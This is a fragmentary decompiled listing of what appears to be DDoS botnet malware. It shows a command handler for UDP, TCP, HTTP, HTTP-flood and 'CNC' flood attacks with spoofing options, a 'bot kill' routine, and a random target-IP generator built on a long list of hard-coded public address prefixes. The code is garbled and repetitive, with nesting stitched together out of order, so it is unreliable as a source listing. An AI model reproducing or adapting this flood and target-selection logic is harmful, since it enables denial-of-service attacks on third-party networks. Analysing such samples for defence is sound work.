                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendCNC(v155, v153, v154, 0);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendCNC(v155, v153, v154, 0);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendCNC(v155, v153, v154, 0);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                        sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendCNC(v155, v153, v154, 0);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                        sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendCNC(v155, v153, v154, 0);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendCNC(v155, v153, v154, 0);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                            if (listFork() == 0) {
                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendUDP(v95, v104, v105, v106, v107, v93, v99, v98);
                                    sockprintf(v90, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                    sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                    sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                if (listFork() == 0) {
                                                                    sendTCP(v131, v111, v112, v113, v132, v96, v97);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendCNC(v155, v153, v154, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                    sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v155, v153, v154, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                    sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendCNC(v155, v153, v154, 0);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                        sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                        sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                            if (listFork() == 0) {
                                                                sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                if (listFork() == 0) {
                    __GI_inet_ntoa(v92);
                    v145 = sockprintf(v90, (int32_t)"COMMENCING BOT KILL ON -> %s");
                    botkiller(v145);
            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                __GI_inet_ntoa(v92);
                sockprintf(v90, (int32_t)"My Public IP: %s");
                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                            sockprintf(v90, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                        if (listFork() == 0) {
                                                            sendUDP(v124, v104, v105, v106, v107, v93, v99, v98);
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                            sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                            sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v131, v111, v112, v113, v132, v96, v97);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                            while (true) {
                                                                if (listFork() == 0) {
                    sockprintf(v90, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                    sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                    sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                if (listFork() == 0) {
                                                    sendTCP(v131, v111, v112, v113, v132, v96, v97);
                                                    while (true) {
                                                        if (listFork() == 0) {
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                            while (true) {
                                                                if (listFork() == 0) {
                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                    if (listFork() == 0) {
                                                                        sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                        sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                    if (listFork() == 0) {
                                        sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                        while (true) {
                                            if (listFork() == 0) {
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 8105
++++++++ FUNCTION END 9454
++++++++ FUNCTION LENGTH 1349
    rand();
    rand();
    int32_t v96 = rand(); // 0xac28
    int32_t v97 = rand(); // 0xac74
    int32_t v98 = rand() % 208; // 0xacd8
        szprintf((int32_t)&v99, (int32_t)"112.5.%d.%d", (int32_t)v94, (int32_t)v95, 0);
        szprintf((int32_t)&v99, (int32_t)"117.165.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"85.3.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"37.158.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"95.9.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"41.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"58.71.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"104.55.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"78.186.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"78.189.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"221.120.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"88.5.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"41.254.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.20.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.47.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.57.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"45.117.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"101.51.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"137.59.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"1.56.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"1.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.204.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.0.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.8.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.50.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.54.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.98.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.112.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.192.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"36.32.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"36.248.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"39.64.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.4.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.48.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.52.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.56.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.63.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.84.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.224.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"42.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.230.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"163.53.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.230.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"62.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.245.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"62.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.25.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.54.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"27.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.204.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.24.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.191.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"81.100.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.189.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"94.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.160.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.161.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.162.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.163.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.164.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.165.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.166.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.167.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.168.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.169.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.170.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.171.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.172.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.173.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.175.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.177.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.178.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.179.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.180.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.181.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.182.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.183.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.184.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.185.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.186.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.187.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.189.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.190.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.191.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"45.121.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"45.120.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"45.115.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.230.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.240.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"43.245.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"41.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"49.118.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"78.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"45.127.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.30.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"14.33.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"123.16.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"202.44.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"116.93.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"91.83.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"41.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.173.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.190.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"146.88.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"112.196.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.178.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"112.45.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"183.223.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"116.71.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"103.44.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"110.235.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"124.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"211.237.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.175.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"117.173.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"178.93.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"111.9.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"222.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"222.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.160.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.161.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.162.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.163.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.164.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.165.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.166.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.167.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.168.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
        szprintf((int32_t)&v99, (int32_t)"113.169.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);
